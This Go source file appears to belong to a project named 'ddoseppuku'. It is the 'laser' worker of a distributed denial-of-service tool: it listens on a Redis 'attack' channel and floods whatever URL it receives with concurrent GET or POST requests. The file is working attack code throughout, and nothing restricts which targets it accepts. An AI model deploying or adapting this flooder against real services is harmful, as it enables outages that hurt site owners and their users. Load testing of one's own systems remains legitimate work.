package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"

	"github.com/go-redis/redis"
	"github.com/michaeloverton/ddoseppuku/internal/env"
	"github.com/michaeloverton/ddoseppuku/internal/message"
	"github.com/sirupsen/logrus"
)

// Temporary constant till we solve the error:
// socket: too many open files
// possible reference:
// http://craigwickesser.com/2015/01/golang-http-to-many-open-files/
// https://mtyurt.net/post/docker-how-to-increase-number-of-open-files-limit.html
func main() {
	// Load the laser environment.
	env, err := env.LoadLaserEnv()
	if err != nil {
		log.Fatal("error loading environment: ", err.Error())
	}

	// Set up http client.
	httpClient := http.Client{}

	// Set up subscription client.
	subClient := redis.NewClient(&redis.Options{
		Addr:     env.RedisAddress,
		Password: "", // no password set
		DB:       0,  // use default DB
	})

	// Test connection to client.
	_, err = subClient.Ping().Result()
	if err != nil {
		log.Fatal("failed to connect to redis", err)
	}

	// Subscribe to the attack topic.
	attackTopic := subClient.Subscribe("attack")
	attackChan := attackTopic.Channel()

	// When a message is received, attack target.
	for {
		select {
		case m := <-attackChan:
			// Unmarshal attack message.
			var attackMsg message.Message
			if err := json.Unmarshal([]byte(m.Payload), &attackMsg); err != nil {
				logrus.Error("failed to attack message unmarshal: ", err)
				return
			}

			logrus.Info(attackMsg)
			go makeRequests(httpClient, attackMsg, env.MaxRequests)
		}
	}

}

func makeRequests(c http.Client, attackMsg message.Message, maxRequests int) {
	// Current number of requests we have made.
	requestCount := 0
	for {
		if requestCount < maxRequests {
			// If we have not maxed  out requests, concurrently make request to target.
			go func() {
				// Create the request to the target - it will always be either GET or POST.
				var req *http.Request
				var err error
				if attackMsg.Method == http.MethodGet {
					// Form GET request.
					req, err = http.NewRequest(http.MethodGet, attackMsg.URL, nil)
					if err != nil {
						logrus.Errorf("failed to create request: %s", err)
						return
					}
				} else {
					// Otherwise, we want POST requests.

					// Marshal the body from the message.
					js, err := json.Marshal(attackMsg.Body)
					if err != nil {
						logrus.Errorf("failed to marshal request body: %s", err)
						return
					}

					// Form POST request.
					req, err = http.NewRequest(http.MethodPost, attackMsg.URL, bytes.NewReader(js))
					if err != nil {
						logrus.Errorf("failed to create request: %s", err)
						return
					}
				}

				// Make the request.
				res, err := c.Do(req)
				if err != nil {
					logrus.Errorf("request failed: %s", err)
					return
				}
				defer res.Body.Close()

				logrus.Info("status: ", res.StatusCode)
			}()

			// Increment the number of requests we have made.
			requestCount++
		} else {
			// If we've reached max requests, return.
			logrus.Info("end")
			return
		}
	}

}
